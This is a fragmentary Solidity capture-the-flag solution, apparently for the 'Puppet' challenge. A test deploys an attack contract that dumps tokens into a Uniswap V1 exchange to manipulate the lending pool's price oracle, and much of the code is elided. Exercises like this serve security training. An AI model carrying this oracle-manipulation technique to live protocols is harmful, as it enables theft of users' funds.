...
contract PuppetChallenge is Test {
    ...
    function test_puppet() public checkSolvedByPlayer {
        uint tokenBalance = token.balanceOf(player);
        PuppetAttack attack = new PuppetAttack{value: PLAYER_INITIAL_ETH_BALANCE}(address(uniswapV1Exchange), address(lendingPool), recovery, address(token));
        token.transfer(address(attack), tokenBalance);
        attack.attack();
    }
...
contract PuppetAttack {
    ...
    constructor(address _uni, address _pool, address _recovery, address _token) payable {
        uniswapV1Exchange = IUniswapV1Exchange(_uni);
        lendingPool = PuppetPool(_pool);
    ...
    function attack() public {
        ...
        uniswapV1Exchange.tokenToEthTransferInput(tokenBalance, 5, block.timestamp, address(this));
